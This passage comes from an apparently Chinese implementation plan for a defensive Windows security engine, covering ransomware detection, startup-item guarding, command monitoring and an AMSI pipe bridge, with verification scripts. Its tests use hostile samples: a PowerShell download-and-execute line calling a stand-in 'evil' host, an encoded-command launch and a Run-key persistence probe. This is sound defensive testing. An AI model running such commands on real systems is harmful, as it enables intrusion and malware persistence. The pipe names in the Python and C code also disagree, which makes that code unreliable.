    except Exception:
        return 0


class RansomwareShield:
    """实时监控受保护目录：批量改名/勒索扩展名/高熵写入加权检测 → 溯源 → 引擎处置"""

    def __init__(self, engine, dirs: Optional[List[str]] = None, depth: int = 0):
        self.engine = engine
        data = engine.rules.data
        thr = (data.get("thresholds") or {}).get("ransomware") or {}
        self._dirs = [str(d) for d in (dirs or default_protected_dirs()) if d]
        self._depth = max(0, int(depth))
        self._exts = {e.lower() for e in (data.get("ransomware_extensions") or [])}
        self.window_s = float(thr.get("window_s") or 10)
        self.rename_burst = int(thr.get("rename_burst") or 12)
        self.entropy_min = float(thr.get("entropy_min") or 7.0)
        self.trigger_score = int(thr.get("trigger_score") or 50)
        self._q: "queue.Queue[dict]" = queue.Queue()
        self._events: deque = deque(maxlen=5000)
        self._watchers: List[DirWatcher] = []
        self._stop = threading.Event()
        self._reported: set = set()

    def start(self) -> None:
        roots = []
        for d in self._dirs:
            if os.path.isdir(d):
                roots.append(d)
                if self._depth >= 1:
                    try:
                        for sub in Path(d).iterdir():
                            if sub.is_dir():
                                roots.append(str(sub))
                    except OSError:
                        pass
        for d in dict.fromkeys(roots):
            w = DirWatcher(d, self._q)
            self._watchers.append(w)
            w.start()
        threading.Thread(target=self._loop, daemon=True).start()

    def stop(self) -> None:
        self._stop.set()
        for w in self._watchers:
            w.stop()

    # ---------- 检测循环 ----------
    def _loop(self) -> None:
        while not self._stop.wait(1.0):
            self._drain()
            self._analyze()

    def _drain(self) -> None:
        while True:
            try:
                self._events.append((time.time(), self._q.get_nowait()))
            except queue.Empty:
                break

    def _analyze(self) -> None:
        now = time.time()
        while self._events and now - self._events[0][0] > self.window_s:
            self._events.popleft()
        if not self._events:
            return
        recent = [e for _, e in self._events]
        renamed_new = [e for e in recent if e["action"] == _ACTION_RENAMED_NEW]
        added = [e for e in recent if e["action"] == _ACTION_ADDED]
        ext_hits = [e for e in renamed_new
                    if os.path.splitext(e["name"])[1].lower() in self._exts]
        hi_entropy = 0
        for e in added:
            p = e["path"]
            try:
                if os.path.isfile(p) and os.path.getsize(p) >= 1024:
                    with open(p, "rb") as f:
                        ent = file_intel.file_entropy(f.read(65536))
                    if ent >= self.entropy_min:
                        hi_entropy += 1
            except OSError:
                continue
        score = min(len(renamed_new), 50) + (40 if ext_hits else 0) + min(hi_entropy * 4, 40)
        triggered = (score >= self.trigger_score and
                     (ext_hits or hi_entropy >= 2 or len(renamed_new) >= self.rename_burst))
        if not triggered:
            return

        targets = [e["path"] for e in (ext_hits or renamed_new or added)][:50]
        pid = self._attribute(targets, added)
        reason = (f"疑似勒索行为：{self.window_s:.0f}秒窗口内 {len(renamed_new)} 次改名、"
                  f"{len(ext_hits)} 个勒索扩展名、{hi_entropy} 个高熵新文件")
        key = (pid, tuple(targets[:3]))
        if key in self._reported:
            return
        self._reported.add(key)
        self.engine.post({
            "source": "ransomware_shield", "kind": "ransomware",
            "pid": pid or None, "path": targets[0] if targets else None,
            "confidence": 85 if pid else 60,
            "rule_id": "behavior.ransom_burst", "reason": reason,
            "targets": targets,
        })

    def _attribute(self, targets: List[str], added: List[dict]) -> int:
        """优先对高熵打开中的新文件做 Restart Manager 归因"""
        for p in targets[:8] + [e["path"] for e in added[:8]]:
            pid = _file_owner_pid(p)
            if pid:
                return pid
        return 0
```

* [ ] **Step 7.5: 运行验证（预期全 PASS）**

Run: `python scripts/_verify_ransomware_shield.py`
Expected: 全部 PASS。若 "肇事件终止" 因 RM 归因失败而 miss（en v无 pid 时 action=quarantined 仅隔离），检查 child 是否保持 anchor 句柄打开。

* [ ] **Step 7.6: 提交**

```powershell
git add src/zhuzhu_Copilot/core/security_engine/ransomware_shield.py scripts/_ransom_sim_child.py scripts/_verify_ransomware_shield.py ; git commit -m "feat(security): 勒索防护盾（实时监控/行为检测/溯源隔离）"
```

***

### Task 8: 启动项防护 startup\_guard

**Files:**

* Create: `src/zhuzhu_Copilot/core/security_engine/startup_guard.py`

* Create: `scripts/_verify_startup_guard.py`

* [ ] **Step 8.1: 写验证脚本（先失败）**

```python
# scripts/_verify_startup_guard.py
import os, sys, time, winreg
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "src"))

FAILS = []
def check(name, cond, detail=""):
    print(("PASS " if cond else "FAIL ") + name + ((" :: " + detail) if detail else ""))
    if not cond:
        FAILS.append(name)

from zhuzhu_Copilot.core.security_engine.engine import SecurityEngine
from zhuzhu_Copilot.core.security_engine.startup_guard import StartupGuard
from zhuzhu_Copilot.core import security as _sec

RUN = r"Software\Microsoft\Windows\CurrentVersion\Run"
BAD_NAME, BENIGN_NAME = "WmSeTest_njrat_probe", "WmSeTest_benign_probe"
# 恶意名测试用无签名临时 exe（可信签名放行机制不会将其静默放行）
import tempfile as _tmp_mod
_tmpd = _tmp_mod.mkdtemp(prefix="startupguard_")
BAD_CMD = os.path.join(_tmpd, "probe_njrat_demo.exe")
with open(BAD_CMD, "wb") as f:
    f.write(b"MZ" + os.urandom(256))
BENIGN_CMD = r"C:\Windows\System32\notepad.exe"

def set_run(name, cmd):
    with winreg.OpenKey(winreg.HKEY_CURRENT_USER, RUN, 0, winreg.KEY_SET_VALUE) as k:
        winreg.SetValueEx(k, name, 0, winreg.REG_SZ, cmd)

def del_run(name):
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, RUN, 0, winreg.KEY_SET_VALUE) as k:
            winreg.DeleteValue(k, name)
    except OSError:
        pass

def has_run(name):
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, RUN) as k:
            winreg.QueryValueEx(k, name)
        return True
    except OSError:
        return False

for n in (BAD_NAME, BENIGN_NAME):
    del_run(n)

eng = SecurityEngine()
guard = StartupGuard(eng)
events = []
eng.set_notify(lambda p: events.append(p))
eng.add_monitor(guard)
eng.start()
eng.start_monitors()
time.sleep(1.5)   # 基线稳定

# 1) 恶意命名启动项 → 检测并自动删除（隔离备份）
set_run(BAD_NAME, BAD_CMD)
deadline = time.time() + 15
hit = None
while time.time() < deadline:
    time.sleep(0.5)
    hit = next((e for e in events if e["event"].get("entry", {}).get("name") == BAD_NAME), None)
    if hit and not has_run(BAD_NAME):
        break
check("恶意启动项实时发现", hit is not None, str(hit.get("event", {}).get("confidence") if hit else None))
check("恶意启动项自动删除", not has_run(BAD_NAME))
check("删除动作上报", hit is not None and hit.get("action") == "removed", str(hit.get("action") if hit else None))

# 2) 恢复隔离 → 校验可恢复性 → 清理
n = _sec.SecurityScanner().restore_quarantine()
check("启动项隔离恢复", n >= 1, f"restored={n}")
check("隔离恢复后值回归", has_run(BAD_NAME))
del_run(BAD_NAME)

# 3) 良性启动项 → 不告警
set_run(BENIGN_NAME, BENIGN_CMD)
time.sleep(4.0)
check("良性启动项不误报", not any(e["event"].get("entry", {}).get("name") == BENIGN_NAME for e in events))
del_run(BENIGN_NAME)

eng.stop()
import shutil as _sh
_sh.rmtree(_tmpd, ignore_errors=True)
print("TOTAL", len(FAILS), "FAILURES")
sys.exit(1 if FAILS else 0)
```

- [ ] **Step 8.2: 运行验证（预期失败）**

Run: `python scripts/_verify_startup_guard.py`
Expected: FAIL `ModuleNotFoundError`

* [ ] **Step 8.3: 实现 startup\_guard**

`src/zhuzhu_Copilot/core/security_engine/startup_guard.py`：

```python
"""启动项实时防护：注册表 Run/RunOnce 变更通知（RegNotifyChangeKeyValue）+
启动文件夹监听（复用 DirWatcher）。可信签名程序自动放行（trusted_signers 外置）。
"""
import ctypes
import ctypes.wintypes as wt
import os
import queue
import re
import threading
import time
import winreg
from pathlib import Path
from typing import List

from zhuzhu_Copilot.core import security as _sec
from . import signature as _sig
from .ransomware_shield import DirWatcher

advapi32 = ctypes.WinDLL("advapi32", use_last_error=True)
kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)

_RUN_KEYS = [
    ("HKLM", winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run"),
    ("HKCU", winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
    ("HKCU", winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\RunOnce"),
]
_STARTUP_DIRS = [
    Path.home() / "AppData" / "Roaming" / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup",
]


class StartupGuard:
    """运行键与启动文件夹的启动项变更实时防护"""

    def __init__(self, engine):
        self.engine = engine
        self._stop = threading.Event()
        self._known = {(label, key): self._enum_values(hive, key) for label, hive, key in _RUN_KEYS}
        self._seen = set()
        self._whitelist = set()          # 已确认可信的启动项名
        self._folder_q: "queue.Queue[dict]" = queue.Queue()
        self._watchers: List[DirWatcher] = []

    @staticmethod
    def _enum_values(hive, key) -> dict:
        out = {}
        try:
            with winreg.OpenKey(hive, key) as k:
                i = 0
                while True:
                    try:
                        n, v, _ = winreg.EnumValue(k, i)
                    except OSError:
                        break
                    out[n] = v
                    i += 1
        except OSError:
            pass
        return out

    def start(self) -> None:
        for label, hive, key in _RUN_KEYS:
            threading.Thread(target=self._watch_key, args=(label, hive, key), daemon=True).start()
        for d in _STARTUP_DIRS:
            if d.is_dir():
                w = DirWatcher(str(d), self._folder_q)
                self._watchers.append(w)
                w.start()
        threading.Thread(target=self._folder_loop, daemon=True).start()

    def stop(self) -> None:
        self._stop.set()
        for w in self._watchers:
            w.stop()

    # ---------- 注册表监听 ----------
    def _watch_key(self, label: str, hive, key: str) -> None:
        kernel32.CreateEventW.argtypes = [ctypes.c_void_p, wt.BOOL, wt.BOOL, wt.LPCWSTR]
        kernel32.CreateEventW.restype = wt.HANDLE
        kernel32.WaitForSingleObject.argtypes = [wt.HANDLE, wt.DWORD]
        kernel32.ResetEvent.argtypes = [wt.HANDLE]
        kernel32.CloseHandle.argtypes = [wt.HANDLE]
        advapi32.RegNotifyChangeKeyValue.argtypes = [ctypes.c_void_p, wt.BOOL, wt.DWORD, wt.HANDLE, wt.BOOL]
        advapi32.RegNotifyChangeKeyValue.restype = wt.LONG
        advapi32.RegCloseKey.argtypes = [ctypes.c_void_p]

        ev = kernel32.CreateEventW(None, True, False, None)
        try:
            while not self._stop.is_set():
                try:
                    k = winreg.OpenKey(hive, key, 0, winreg.KEY_NOTIFY | winreg.KEY_READ)
                except OSError:
                    break
                hkey = k.Detach()
                try:
                    advapi32.RegNotifyChangeKeyValue(ctypes.c_void_p(hkey), True, 0x1, ev, True)
                    if kernel32.WaitForSingleObject(ev, 1000) == 0:   # WAIT_OBJECT_0
                        kernel32.ResetEvent(ev)
                        before = self._known.get((label, key), {})
                        now = self._enum_values(hive, key)
                        self._known[(label, key)] = now
                        for name, cmd in now.items():
                            if before.get(name) != cmd:
                                self._handle(label, key, name, cmd)
                finally:
                    advapi32.RegCloseKey(ctypes.c_void_p(hkey))
        finally:
            kernel32.CloseHandle(ev)

    # ---------- 启动文件夹监听 ----------
    def _folder_loop(self) -> None:
        while not self._stop.wait(1.0):
            while True:
                try:
                    e = self._folder_q.get_nowait()
                except queue.Empty:
                    break
                if e.get("action") == 1 and e["name"].lower().endswith(".lnk"):
                    self._handle("folder", str(e["dir"]), Path(e["name"]).stem,
                                 self._lnk_target(e["path"]))

    @staticmethod
    def _lnk_target(path: str) -> str:
        try:
            import pythoncom
            import win32com.client
            pythoncom.CoInitialize()
            shell = win32com.client.Dispatch("WScript.Shell")
            return str(shell.CreateShortcut(str(path)).TargetPath or "")
        except Exception:
            return ""

    # ---------- 判定 ----------
    def _handle(self, label: str, key: str, name: str, cmd: str) -> None:
        if not cmd:
            return
        if (label, key, name) in self._seen:
            return
        self._seen.add((label, key, name))
        sample = self._build_sample(name, cmd)
        if sample is None:
            return                      # 可信签名 → 静默放行
        hits = self.engine.rules.match(sample, category="startup")
        if not hits:
            return
        conf = max(int(r.get("confidence") or 0) for r, _ in hits)
        self.engine.post({
            "source": "startup_guard", "kind": "startup", "confidence": conf,
            "rule_id": hits[0][0].get("id"), "reason": f"新增启动项 {name}: {cmd}",
            "entry": {"where": key, "name": name, "command": cmd, "hive": label},
        })

    def _build_sample(self, name: str, cmd: str):
        exe = self._first_exe(cmd)
        sample = {"kind": "startup", "name": name, "cmdline": str(cmd),
                  "path": str(cmd), "exe_name": Path(exe).name.lower() if exe else ""}
        if exe and os.path.isfile(exe):
            sig_ok = _sec._has_valid_signature(exe)
            signer = _sig.signer_subject(exe) if sig_ok else ""
            sample["signer"] = signer
            trusted = [str(t).lower() for t in (self.engine.rules.data.get("trusted_signers") or [])]
            if sig_ok and signer and any(t and t in signer.lower() for t in trusted):
                return None             # 可信签名 → 放行
        return sample

    @staticmethod
    def _first_exe(cmd: str) -> str:
        m = re.match(r'^\s*(?:"([^"]+)"|(\S+))', cmd or "")
        cand = (m.group(1) or m.group(2) or "") if m else ""
        if os.path.splitext(cand)[1].lower() in (".exe", ".com", ".scr", ".bat", ".cmd", ".js", ".vbs"):
            return cand
        return ""
```

* [ ] **Step 8.4: 运行验证（预期全 PASS）**

Run: `python scripts/_verify_startup_guard.py`
Expected: 全部 PASS（HKCU 写权限即可，无需管理员）

* [ ] **Step 8.5: 提交**

```powershell
git add src/zhuzhu_Copilot/core/security_engine/startup_guard.py scripts/_verify_startup_guard.py ; git commit -m "feat(security): 启动项实时防护（注册表变更通知+文件夹监听+可信签名放行）"
```

***

### Task 9: 命令监控 command\_intel

**Files:**

* Create: `src/zhuzhu_Copilot/core/security_engine/command_intel.py`

* Create: `scripts/_verify_command_intel.py`

* [ ] **Step 9.1: 写验证脚本（先失败）**

```python
# scripts/_verify_command_intel.py
import base64, os, subprocess, sys, time
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "src"))

FAILS = []
def check(name, cond, detail=""):
    print(("PASS " if cond else "FAIL ") + name + ((" :: " + detail) if detail else ""))
    if not cond:
        FAILS.append(name)

from zhuzhu_Copilot.core.security_engine.engine import SecurityEngine
from zhuzhu_Copilot.core.security_engine.command_intel import CommandIntel

eng = SecurityEngine()
intel = CommandIntel(eng, poll_s=0.5)
events = []
eng.set_notify(lambda p: events.append(p))
eng.add_monitor(intel)
eng.start()
eng.start_monitors()

# 1) 良性进程 → 命令监控历史记录含目标命令行（真实进程 + PEB 命令行读取）
probe = "cmdintel_probe_ok_731"
p1 = subprocess.Popen(["powershell", "-NoProfile", "-Command", f"Write-Output {probe}"])
p1.wait(timeout=60)
deadline = time.time() + 20
hit1 = None
while time.time() < deadline:
    time.sleep(0.5)
    hit1 = next((e for e in intel.history
                 if probe in str(e.get("cmdline") or "")), None)
    if hit1:
        break
check("新进程命令行捕获", hit1 is not None, f"mode={intel.mode}")

# 2) 编码执行 → 高置信拦截（引擎自动终止 powershell 子进程）
payload = base64.b64encode("Write-Output cmdintel_evil_731".encode("utf-16-le")).decode()
p2 = subprocess.Popen(["powershell", "-NoProfile", "-EncodedCommand", payload],
                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
deadline = time.time() + 25
hit2 = None
while time.time() < deadline:
    time.sleep(0.5)
    hit2 = next((e for e in events if "EncodedCommand" in str(e["event"].get("cmdline") or "")), None)
    if hit2 and p2.poll() is not None:
        break
check("编码执行检测高置信", hit2 is not None and hit2["event"].get("confidence", 0) >= 80,
      str((hit2 or {}).get("event", {}).get("confidence")))
check("编码执行进程被终止", p2.poll() is not None)
if p2.poll() is None:
    p2.kill()

eng.stop()
print("TOTAL", len(FAILS), "FAILURES")
sys.exit(1 if FAILS else 0)
```

* [ ] **Step 9.2: 运行验证（预期失败）**

Run: `python scripts/_verify_command_intel.py`
Expected: FAIL `ModuleNotFoundError`

* [ ] **Step 9.3: 实现 command\_intel**

`src/zhuzhu_Copilot/core/security_engine/command_intel.py`：

```python
"""命令监控：Win32_ProcessStartTrace WMI 订阅（失败自动降级快照对比）+
PEB 命令行读取 → 复用 execution_guard 破坏性/无文件规则 + 规则引擎命令类规则。
"""
import threading
import time
from collections import deque
from pathlib import Path
from typing import Optional

from zhuzhu_Copilot.core import security as _sec
from zhuzhu_Copilot.core import execution_guard as _eg

logger = __import__("zhuzhu_Copilot.utils.helpers", fromlist=["setup_logging"]).setup_logging()


class CommandIntel:
    """新进程命令监控（真实 API：WMI 事件订阅 / 快照对比，PEB 命令行）"""

    def __init__(self, engine, poll_s: float = 1.0):
        self.engine = engine
        self._stop = threading.Event()
        self._poll_s = max(0.2, float(poll_s))
        self._recent: deque = deque(maxlen=2000)
        self.history: deque = deque(maxlen=500)   # 全部新进程记录（含良性，供监测与调试）
        self.mode = "starting"          # wmi | poll
        self._baseline: set = set()

    def start(self) -> None:
        threading.Thread(target=self._run, daemon=True).start()

    def stop(self) -> None:
        self._stop.set()

    def _run(self) -> None:
        if not self._wmi_loop():
            logger.info("WMI 进程创建订阅不可用，降级快照对比模式")
            self.mode = "poll"
            self._baseline = {p["pid"] for p in _sec._enum_processes()}
            self._poll_loop()

    # ---------- WMI 订阅 ----------
    def _wmi_loop(self) -> bool:
        try:
            import pythoncom
            import win32com.client
            pythoncom.CoInitialize()
            loc = win32com.client.Dispatch("WbemScripting.SWbemLocator")
            svc = loc.ConnectServer(".", "root\\cimv2")
            q = svc.ExecNotificationQuery("SELECT * FROM Win32_ProcessStartTrace")
            self.mode = "wmi"
            while not self._stop.is_set():
                try:
                    ev = q.NextEvent(1000)
                except Exception:
                    if not self._stop.is_set():
                        return False        # 订阅断裂 → 降级快照模式
                    break
                if ev is None:
                    continue
                self._handle_process(int(getattr(ev, "ProcessID", 0) or 0),
                                     str(getattr(ev, "ProcessName", "") or ""))
            return True
        except Exception:
            return False

    # ---------- 快照对比（降级模式） ----------
    def _poll_loop(self) -> None:
        while not self._stop.wait(self._poll_s):
            try:
                now = {p["pid"] for p in _sec._enum_processes()}
            except Exception:
                continue
            for pid in sorted(now - self._baseline):
                self._handle_process(pid, "")
            self._baseline = now

    # ---------- 分析 ----------
    def _handle_process(self, pid: int, pname: str) -> None:
        if pid in self._recent or pid <= 4:
            return
        self._recent.append(pid)
        path = _sec._process_path(pid)
        cmd = _eg._process_cmdline(pid) or path
        if not cmd and not pname:
            return
        name = pname or Path(path).name if path else f"PID {pid}"
        exe = Path(path).name.lower() if path else Path(pname).name.lower() if pname else ""
        self.history.append({"pid": pid, "name": name, "cmdline": cmd, "path": path})
        toks = _eg._tokens(cmd)
        low = cmd.lower()

        conf, reason, rule_id = 0, "", ""
        r = _eg._fileless_reason(exe, toks, low)
        if r:
            conf, reason, rule_id = 90, r, "cmd.fileless"
        else:
            r2 = _eg._destructive_reason(exe, toks)
            if r2:
                conf, reason, rule_id = 60, r2, "cmd.destructive"
        hit_conf = self.engine.rules.confidence(
            {"kind": "command", "cmdline": cmd, "name": name, "path": path,
             "exe_name": exe}, category="command")
        if hit_conf > conf:
            conf = hit_conf
        if not conf:
            return
        self.engine.post({
            "source": "command_intel", "kind": "process", "pid": pid,
            "cmdline": cmd, "confidence": conf, "rule_id": rule_id, "reason": reason or "可疑命令",
        })
```

* [ ] **Step 9.4: 运行验证（预期全 PASS）**

Run: `python scripts/_verify_command_intel.py`
Expected: 全部 PASS

* [ ] **Step 9.5: 提交**

```powershell
git add src/zhuzhu_Copilot/core/security_engine/command_intel.py scripts/_verify_command_intel.py ; git commit -m "feat(security): 命令监控（WMI订阅+快照降级，复用执行防护规则）"
```

***

### Task 10: AMSI 管道桥 amsi\_bridge

**Files:**

* Create: `src/zhuzhu_Copilot/core/security_engine/amsi_bridge.py`

* Create: `scripts/_verify_amsi_bridge.py`

* [ ] **Step 10.1: 写验证脚本（先失败）**

```python
# scripts/_verify_amsi_bridge.py
import os, sys, struct, time
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "src"))

FAILS = []
def check(name, cond, detail=""):
    print(("PASS " if cond else "FAIL ") + name + ((" :: " + detail) if detail else ""))
    if not cond:
        FAILS.append(name)

import win32file, win32pipe
from zhuzhu_Copilot.core.security_engine.engine import SecurityEngine
from zhuzhu_Copilot.core.security_engine.amsi_bridge import (AmsiBridge, register_provider,
                                                              unregister_provider, is_registered)
from zhuzhu_Copilot.utils.helpers import is_admin

eng = SecurityEngine()
bridge = AmsiBridge(eng)
eng.start()
bridge.start()
time.sleep(0.5)

def ask(script):
    import json
    body = json.dumps({"content": script, "name": "probe.ps1"}).encode("utf-8")
    frame = struct.pack("<I", len(body)) + body
    h = win32file.CreateFile(bridge.pipe, win32file.GENERIC_READ | win32file.GENERIC_WRITE,
                             0, None, win32file.OPEN_EXISTING, 0, None)
    try:
        win32file.WriteFile(h, frame)
        code, head = win32file.ReadFile(h, 4)
        (n,) = struct.unpack("<I", head)
        code2, reply = win32file.ReadFile(h, n)
        return json.loads(reply.decode("utf-8"))
    finally:
        win32file.CloseHandle(h)

r = ask('IEX (New-Object Net.WebClient).DownloadString("http://evil/x")')
check("恶意脚本判定detected", r.get("detected") is True and r.get("confidence", 0) >= 80, str(r))
check("扫描计数+1", bridge.scanned >= 1)
r2 = ask("Get-Date | Out-File d.txt")
check("良性脚本不误报", r2.get("detected") is False, str(r2))
check("检出计数1", bridge.detected >= 1)

# 注册表注册/反注册（仅管理员环境可验证；非管理员验证失败路径返回 False）
if is_admin():
    ok = register_provider(r"C:\Windows\System32\kernel32.dll")   # 注册表值仅写路径，不校验文件
    check("AMSI注册表注册", ok and is_registered())
    check("AMSI注册表反注册", unregister_provider() and not is_registered())
else:
    check("无管理员：注册返回False", register_provider("x.dll") is False)
    check("无管理员：is_registered不抛异常", isinstance(is_registered(), bool))

bridge.stop()
eng.stop()
print("TOTAL", len(FAILS), "FAILURES")
sys.exit(1 if FAILS else 0)
```

* [ ] **Step 10.2: 运行验证（预期失败）**

Run: `python scripts/_verify_amsi_bridge.py`
Expected: FAIL `ModuleNotFoundError`

* [ ] **Step 10.3: 实现 amsi\_bridge**

`src/zhuzhu_Copilot/core/security_engine/amsi_bridge.py`：

```python
"""AMSI 管道桥：原生 Provider DLL 通过 named pipe 投递脚本内容 → 规则引擎判定 → 回传结果。

帧协议（DLL 与本模块共享）：[4字节小端长度][UTF-8 JSON]
  请求: {"content": str, "name": str}   响应: {"detected": bool, "confidence": int}
注册表注册（管理员）：Windows 加载 AMSI Provider 的官方位置。
"""
import json
import struct
import threading
import winreg

import pywintypes
import win32file
import win32pipe

PIPE_NAME = "zhuzhu CopilotAmsiPipe"
PROVIDER_GUID = "{7C4E1B9A-2F0D-4A6B-9C3E-5D8F1A2B3C40}"
_REG_PROVIDERS = r"SOFTWARE\Microsoft\AMSI\Providers" + "\\" + PROVIDER_GUID
_REG_CLSID = r"SOFTWARE\Classes\CLSID" + "\\" + PROVIDER_GUID
_REG_INPROC = _REG_CLSID + r"\InprocServer32"
_HEADER = struct.Struct("<I")

logger = __import__("zhuzhu_Copilot.utils.helpers", fromlist=["setup_logging"]).setup_logging()


class AmsiBridge:
    """named pipe 服务：接收 AMSI Provider 判定请求（非阻塞，服务离线时 DLL 侧超时降级放行）"""

    def __init__(self, engine, pipe_name: str = PIPE_NAME):
        self.engine = engine
        self.pipe = f"\\\\.\\pipe\\{pipe_name}"
        self._stop = threading.Event()
        self.scanned = 0
        self.detected = 0

    def start(self) -> None:
        threading.Thread(target=self._serve, daemon=True).start()

    def stop(self) -> None:
        self._stop.set()
        try:
            f = win32file.CreateFile(self.pipe, win32file.GENERIC_READ | win32file.GENERIC_WRITE,
                                     0, None, win32file.OPEN_EXISTING, 0, None)
            win32file.CloseHandle(f)
        except pywintypes.error:
            pass

    def _serve(self) -> None:
        while not self._stop.is_set():
            try:
                h = win32pipe.CreateNamedPipe(
                    self.pipe, win32pipe.PIPE_ACCESS_DUPLEX,
                    win32pipe.PIPE_TYPE_BYTE | win32pipe.PIPE_WAIT,
                    1, 65536, 65536, 1000, None)
            except pywintypes.error:
                break
            try:
                try:
                    win32pipe.ConnectNamedPipe(h, None)
                except pywintypes.error as e:
                    if e.winerror != 535:      # ERROR_PIPE_CONNECTED
                        raise
                while not self._stop.is_set():
                    err, head = win32file.ReadFile(h, _HEADER.size)
                    if err != 0 or len(head) < _HEADER.size:
                        break
                    (n,) = _HEADER.unpack(head)
                    err, body = win32file.ReadFile(h, n)
                    if err != 0 or not body:
                        break
                    self._handle(h, body)
            except pywintypes.error:
                pass
            finally:
                try:
                    win32pipe.DisconnectNamedPipe(h)
                except pywintypes.error:
                    pass
                win32file.CloseHandle(h)

    def _handle(self, h, body: bytes) -> None:
        try:
            req = json.loads(body.decode("utf-8"))
        except (ValueError, UnicodeDecodeError):
            return
        content = str(req.get("content") or "")
        hits = self.engine.rules.match(
            {"kind": "script", "script": content, "name": str(req.get("name") or ""),
             "cmdline": content}, category="script")
        conf = max((int(r.get("confidence") or 0) for r, _ in hits), default=0)
        detected = conf >= int(self.engine.policy.get("high") or 80)
        self.scanned += 1
        if detected:
            self.detected += 1
        reply = json.dumps({"detected": detected, "confidence": conf}).encode("utf-8")
        try:
            win32file.WriteFile(h, _HEADER.pack(len(reply)) + reply)
        except pywintypes.error:
            pass


# ---------- 注册表注册/反注册（管理员） ----------
def register_provider(dll_path: str) -> bool:
    try:
        k = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, _REG_PROVIDERS)
        winreg.SetValueEx(k, "", 0, winreg.REG_SZ, dll_path)
        winreg.CloseKey(k)
        k = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, _REG_CLSID)
        winreg.SetValueEx(k, "", 0, winreg.REG_SZ, "zhuzhu Copilot AMSI Provider")
        winreg.CloseKey(k)
        k = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, _REG_INPROC)
        winreg.SetValueEx(k, "", 0, winreg.REG_SZ, dll_path)
        winreg.SetValueEx(k, "ThreadingModel", 0, winreg.REG_SZ, "Both")
        winreg.CloseKey(k)
        return True
    except OSError:
        return False


def unregister_provider() -> bool:
    try:
        winreg.DeleteKey(winreg.HKEY_LOCAL_MACHINE, _REG_INPROC)
        winreg.DeleteKey(winreg.HKEY_LOCAL_MACHINE, _REG_CLSID)
        winreg.DeleteKey(winreg.HKEY_LOCAL_MACHINE, _REG_PROVIDERS)
        return True
    except OSError:
        return False


def is_registered() -> bool:
    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, _REG_PROVIDERS) as k:
            return bool(winreg.QueryValueEx(k, "")[0])
    except OSError:
        return False
```

* [ ] **Step 10.4: 运行验证（预期全 PASS）**

Run: `python scripts/_verify_amsi_bridge.py`
Expected: 全部 PASS

* [ ] **Step 10.5: 提交**

```powershell
git add src/zhuzhu_Copilot/core/security_engine/amsi_bridge.py scripts/_verify_amsi_bridge.py ; git commit -m "feat(security): AMSI管道桥（判定回传+注册表注册/反注册）"
```

***

### Task 11: 原生 AMSI Provider DLL（C）+ 端到端验证

**Files:**

* Create: `build/amsi_provider/amsi_provider.c`

* Create: `build/amsi_provider/amsi_provider.def`

* Create: `build/amsi_provider/build_amsi.ps1`

* Create: `scripts/_verify_amsi_dll.py`

* [ ] **Step 11.1: 写 C 源码**

`build/amsi_provider/amsi_provider.c`：

```c
/* zhuzhu Copilot AMSI Provider (native DLL)
 * 只做投递：IAntimalwareProvider::Scan 读入脚本内容，经 named pipe 交主程序判定，
 * 超时/失败一律返回 CLEAN，绝不卡死宿主的脚本执行（AMSI Provider 强制性能要求）。
 */
#include <windows.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

#define MAX_SCAN_BYTES   (1024 * 1024)
#define PIPE_TIMEOUT_MS  1000
#define PATH_BUF         2048

static const WCHAR kPipeName[]  = L"\\\\.\\pipe\\zhuzhu_CopilotAmsiPipe";
static const WCHAR kRegProviders[] = L"SOFTWARE\\Microsoft\\AMSI\\Providers\\{7C4E1B9A-2F0D-4A6B-9C3E-5D8F1A2B3C40}";
static const WCHAR kRegClsid[]     = L"SOFTWARE\\Classes\\CLSID\\{7C4E1B9A-2F0D-4A6B-9C3E-5D8F1A2B3C40}";
static const WCHAR kRegInproc[]    = L"SOFTWARE\\Classes\\CLSID\\{7C4E1B9A-2F0D-4A6B-9C3E-5D8F1A2B3C40}\\InprocServer32";

static const GUID CLSID_AmsiProvider =
    { 0x7C4E1B9A, 0x2F0D, 0x4A6B, { 0x9C,0x3E,0x5D,0x8F,0x1A,0x2B,0x3C,0x40 } };
static const IID IID_IAntimalwareProvider =
    { 0xB4C0F08B, 0xCE12, 0x4B1B, { 0x98,0x88,0x66,0x36,0x27,0x3D,0x5B,0x31 } };
static const IID IID_IClassFactory =
    { 0x00000001, 0x0000, 0x0000, { 0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46 } };
static const IID IID_IUnknown =
    { 0x00000000, 0x0000, 0x0000, { 0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46 } };

typedef LONG AMSI_RESULT;

/* --- Provider 对象（IAntimalwareProvider） --- */
typedef struct ProviderVtbl ProviderVtbl;
typedef struct Provider {
    ProviderVtbl *lpVtbl;
    LONG ref;
} Provider;

struct ProviderVtbl {
    HRESULT (STDMETHODCALLTYPE *QueryInterface)(void*, REFIID, void**);
    ULONG   (STDMETHODCALLTYPE *AddRef)(void*);
    ULONG   (STDMETHODCALLTYPE *Release)(void*);
    HRESULT (STDMETHODCALLTYPE *Scan)(void*, IStream*, AMSI_RESULT*);
    void    (STDMETHODCALLTYPE *CloseSession)(void*, ULONGLONG);
    void    (STDMETHODCALLTYPE *DisplayName)(void*, LPWSTR*);
};

static Provider provider_obj_vtbl_ref = { NULL, 1 };
static volatile LONG g_com_objects = 0;
static volatile LONG g_locks = 0;

/* --- IStream 读取（vtable 第 4 槽位） --- */
typedef struct StreamVtbl {
    HRESULT (STDMETHODCALLTYPE *QueryInterface)(void*, REFIID, void**);
    ULONG   (STDMETHODCALLTYPE *AddRef)(void*);
